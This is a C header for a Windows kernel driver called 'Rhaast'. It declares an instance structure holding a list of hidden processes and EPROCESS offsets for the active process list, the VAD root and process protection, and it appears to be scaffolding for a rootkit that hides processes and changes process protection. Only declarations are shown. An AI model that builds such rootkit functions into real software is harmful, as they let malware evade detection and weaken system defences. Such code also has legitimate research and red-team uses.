#pragma once

#include <Common.h>

/* import headers */
#include <Macros.h>
#include <Defines.h>
#include <Process.h>
#include <PsList.h>
#include <List.h>
#include <Transport.h>
#include <Memory.h>
#include <Command.h>
#include <Native.h>
#include <Callbacks.h>

/* Driver Instance struct */
typedef struct _INSTANCE {
    /* driver main object */
    PDRIVER_OBJECT  DriverObject;
    PUNICODE_STRING RegistryPath;

    PVOID NtKrnlOs;

    /* Windows Build number */
    ULONG WindowsBuild;

    /* device object created for I/O */
    PDRIVER_OBJECT DeviceObject;

    /* linked list */
    PPSHIDDEN_LIST PsHiddenList;

    /* Offsets */
    struct
    {
        ULONG64 ProcessLock;
        ULONG64 ProcessActiveList;
        ULONG64 ProcessVadRoot;
        ULONG64 ProcessProtection;
    } Ofs;
} INSTANCE, *PINSTANCE;

/* defines */
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnload;

/* global instance */
extern INSTANCE Instance;

NTSTATUS RhaastEntry(
    VOID
);

NTSTATUS RhaastInit(
    VOID
);

VOID RhaastUnLoad(
    _In_ PDRIVER_OBJECT DriverObject
); 